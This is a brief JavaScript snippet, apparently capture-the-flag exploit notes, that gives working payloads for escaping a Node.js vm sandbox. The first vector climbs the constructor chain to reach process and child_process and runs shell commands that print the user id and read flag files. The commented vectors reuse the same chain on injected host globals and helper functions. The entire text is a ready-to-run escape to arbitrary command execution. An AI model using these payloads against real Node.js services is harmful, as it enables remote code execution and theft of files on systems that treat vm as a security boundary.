// node:vm sandbox escape — host-object leak family. Run as the sandbox `code`.
// Vector 1: `this` host-bound (proven on this platform's online-script-exec challenge)
this.constructor.constructor('return process')()
  .mainModule.require('child_process')
  .execSync('id; cat /challenge/flag.txt /flag* 2>/dev/null').toString();

// Vector 2: enumerate injected host globals first when vector 1 returns undefined
// console.log(Object.getOwnPropertyNames(globalThis));   // pick injected functions → same chain on them
// Vector 3: vm.runInNewContext(code, {helper: fn}) → every sandbox value is host-realm
// helper.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString();
